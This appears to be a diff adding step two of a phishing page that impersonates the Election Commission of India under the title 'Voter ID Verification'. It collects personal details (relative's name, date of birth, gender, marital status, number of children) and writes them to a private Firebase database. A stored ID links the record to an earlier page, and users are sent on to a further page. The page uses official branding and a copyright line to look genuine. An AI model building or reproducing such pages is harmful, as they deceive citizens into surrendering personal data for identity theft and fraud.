@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voter ID Verification - Step 2</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+        .logo-box { margin-bottom: 15px; }
+        .logo-box img { width: 60px; height: auto; object-fit: contain; }
+        .form-container h2 { margin-bottom: 20px; color: #0056b3; font-size: 22px; }
+        .form-group { margin-bottom: 15px; text-align: left; }
+        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
+        .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
+        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-next:hover { background: #004085; }
+        .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="logo-box">
+            <img src="logo.png" alt="Election Commission Logo">
+        </div>
+
+        <h2>Additional Details</h2>
+        
+        <form id="secondForm">
+            <div class="form-group">
+                <label for="fatherName">Father's / Husband's Name</label>
+                <input type="text" id="fatherName" name="fatherName" placeholder="Enter relative's name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob" name="dob" required>
+            </div>
+
+            <div class="form-group">
+                <label for="gender">Gender</label>
+                <select id="gender" name="gender" required>
+                    <option value="">Select Gender</option>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="maritalStatus">Marital Status</label>
+                <select id="maritalStatus" name="maritalStatus" required>
+                    <option value="">Select Status</option>
+                    <option value="Unmarried">Unmarried</option>
+                    <option value="Married">Married</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="childrenCount">Number of Children</label>
+                <input type="number" id="childrenCount" name="childrenCount" placeholder="Enter number of children" min="0" required>
+            </div>
+
+            <button type="submit" class="btn-next">Submit & Continue</button>
+        </form>
+
+        <div class="footer-text">
+            © 2026 Election Commission of India. All rights reserved.
+        </div>
+    </div>
+
+    <!-- Firebase Integration Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
+            authDomain: "voter-verification-a04d5.firebaseapp.com",
+            projectId: "voter-verification-a04d5",
+            storageBucket: "voter-verification-a04d5.firebasestorage.app",
+            messagingSenderId: "582458013788",
+            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
+            measurementId: "G-8CX5BVQXFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('secondForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fatherName = document.getElementById('fatherName').value;
+            const dob = document.getElementById('dob').value;
+            const gender = document.getElementById('gender').value;
+            const maritalStatus = document.getElementById('maritalStatus').value;
+            const childrenCount = document.getElementById('childrenCount').value;
+
+            // लोकल स्टोरेज से पिछले पेज पर बनी Firebase Document ID प्राप्त करें
+            const docId = localStorage.getItem('voterDocId');
+
+            if (!docId) {
+                alert("Session expired. Please start from the first page.");
+                window.location.href = "index.html";
+                return;
+            }
+
+            try {
+                const docRef = doc(db, "voterSubmissions", docId);
+                // उसी रिकॉर्ड में दूसरे पेज की जानकारी अपडेट करें
+                await updateDoc(docRef, {
+                    fatherName: fatherName,
+                    dob: dob,
+                    gender: gender,
+                    maritalStatus: maritalStatus,
+                    childrenCount: childrenCount
+                });
+
+                // अगले पेज पर भेजें (या जो भी आपका अगला स्टेप हो)
+                window.location.href = "thirdpage.html"; // जरूरत के अनुसार अगला पेज बदल सकते हैं
+            } catch (error) {
+                console.error("Error updating document: ", error);
+                alert("डेटा सेव करने में समस्या हुई, कृपया पुनः प्रयास करें।");
+            }
+        });
+    </script>
+</body>
+</html>
